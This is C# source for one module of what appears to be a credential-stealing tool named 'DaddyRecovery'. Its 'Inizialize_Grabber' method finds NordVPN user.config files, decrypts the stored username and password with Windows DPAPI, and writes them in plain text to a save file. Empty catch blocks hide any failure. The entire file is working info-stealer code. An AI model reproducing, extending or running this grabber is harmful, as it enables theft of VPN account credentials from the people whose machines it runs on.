namespace DaddyRecovery.Applications
{
    using System.Linq;
    using System;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    using System.Xml;
    using Helpers;

    public static class NordVPN
    {
        public static void Inizialize_Grabber()
        {
            try
            {
                var nord = new DirectoryInfo(GlobalPath.NordPath);
                if (nord.Exists)
                {
                    foreach (var info in nord.GetDirectories("NordVpn.exe*").SelectMany(nordir => nordir.GetDirectories().Select(info => info)))
                    {
                        string userConfigPath = CombineEx.CombinePath(info.FullName, "user.config");
                        if (CombineEx.ExistsFile(userConfigPath))
                        {
                            var xf = new XmlDocument() { XmlResolver = null };
                            xf.Load(userConfigPath);

                            string encodedUsername = xf.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                            string encodedPassword = xf.SelectSingleNode("//setting[@name='Password']/value").InnerText;

                            if (!string.IsNullOrWhiteSpace(encodedUsername) || !string.IsNullOrWhiteSpace(encodedPassword))
                            {
                                string decuser = DecryptTools.DecodeNord(encodedUsername, DataProtectionScope.LocalMachine);
                                string decpass = DecryptTools.DecodeNord(encodedPassword, DataProtectionScope.LocalMachine);

                                CombineEx.CreateFile(true, GlobalPath.NordSave, $"Login: {decuser} \r\nPassword: {decpass}\r\n");
                            }
                        }
                    }
                }
            }
            catch { }
        }
    }
}